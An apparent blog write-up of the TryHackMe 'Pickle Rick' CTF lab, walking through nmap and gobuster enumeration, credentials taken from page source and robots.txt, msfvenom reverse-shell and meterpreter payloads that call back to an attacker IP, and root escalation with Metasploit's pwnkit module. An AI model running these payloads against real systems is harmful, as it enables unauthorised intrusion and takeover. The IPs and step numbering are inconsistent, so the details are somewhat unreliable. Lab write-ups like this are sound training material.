+++
draft = false
date = "2024-04-07T00:00:00+00:00"
title = "TryHackMe Room: Pickle Rick Writeup"
description = "A detailed walkthrough of the Pickle Rick room on TryHackMe."
slug = ""
authors = ["Ahmed Boureghida"]
tags = ["TryHackMe", "Pickle Rick", "CTF", "Enumeration", "Privilege Escalation", "Metasploit"]
categories = ["Cybersecurity", "CTF"]
externalLink = ""
series = []
+++

---

# TryHackMe Room: Pickle Rick

**Description:** A Rick and Morty themed CTF where the objective is to help turn Rick back into a human!

**Difficulty:** Easy

**Link:** [Pickle Rick Room](https://tryhackme.com/r/room/picklerick)

## 1. Enumeration with Nmap

We initiate a comprehensive scan of the target machine using Nmap to identify available services and potential vulnerabilities:

```bash
sudo nmap -sS -sV -A -sC --script=vuln -T5 10.10.225.125
```
The scan reveals two open ports:
```
    OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
    Apache httpd 2.4.18 (Ubuntu)
```
Despite identifying potential vulnerabilities, further exploration did not yield any exploitable weaknesses.
## 2. Directory Enumeration with Gobuster

Conducting directory enumeration using Gobuster to uncover hidden paths:
```bash
gobuster dir -u http://10.10.201.211 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o out.txt
```
>> find 
```bash
robots.txt
login.php
```
## 3. Examining Web Page Source

Upon inspecting the page source at http://10.10.225.125/, we discover a comment revealing a username:
```html
<!--
    Note to self, remember username!

    Username: R1ckRul3s
-->
```
## 5. Access Discovery and Login

Inside robots.txt, we find a potential password: ```Wubbalubbadubdub```. Utilizing these credentials, we successfully log in at http://10.10.201.211/login.php with the username ```R1ckRul3s```.
## 6. Exploring Command Panel

Accessing the Command Panel, we locate a file named Sup3rS3cretPickl3Ingred.txt. However, attempts to view its contents are met with a message indicating restricted access.
## 7. Obtaining Remote Shell

Setting up a reverse shell using nc and msfvenom, we gain remote access to the target machine:
```bash
nc -lnvp 4444
msfvenom -p cmd/unix/reverse_bash LHOST=10.2.9.172 LPORT=4444 -f raw
```

## 8. Retrieving Ingredient

Although unable to view the contents of Sup3rS3cretPickl3Ingred.txt, we discover its first ingredient: mr. meeseek hair.

## 9. Obtaining Metasploit Shell

We proceed to obtain a Metasploit shell by setting up a listener on the remote machine and executing the payload from our local machine:
```bash
nc -lnvp 5555 > /tmp/shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=your_ip_address LPORT=your_port -f elf > shell.elf
nc 10.10.201.211 5555 < shell.elf
./tmp/shell
```

## 11. Ingredient Discovery

Searching for ingredients using the command "search -f ingred" reveals the location of the second ingredient at /home/rick/second ingredients.
## 12. Privilege Escalation

After identifying a privilege escalation vulnerability
```bash
in metasplloit i run  use post/multi/recon/local_exploit_suggester
   and i get 
   [+] 10.10.10.140 - exploit/linux/local/bpf_sign_extension_priv_esc: The target appears to be vulnerable.
[+] 10.10.10.140 - exploit/linux/local/cve_2021_3493_overlayfs: The target appears to be vulnerable.
[+] 10.10.10.140 - exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec: The target is vulnerable.
[+] 10.10.10.140 - exploit/linux/local/cve_2022_0995_watch_queue: The target appears to be vulnerable.
[+] 10.10.10.140 - exploit/linux/local/glibc_realpath_priv_esc: The target appears to be vulnerable.
[+] 10.10.10.140 - exploit/linux/local/pkexec: The service is running, but could not be validated.
[+] 10.10.10.140 - exploit/linux/local/ptrace_traceme_pkexec_helper: The target appears to be vulnerable.
[+] 10.10.10.140 - exploit/linux/local/su_login: The target appears to be vulnerable.
[+] 10.10.10.140 - exploit/linux/local/sudo_baron_samedit: The target appears to be vulnerable```

after trying this work for me linux/local/cve_2021_4034_pwnkit_lpe_pkexec

 we successfully elevate our privileges to root. Accessing /root/3rd.txt, we uncover the third ingredient: fleeb juice
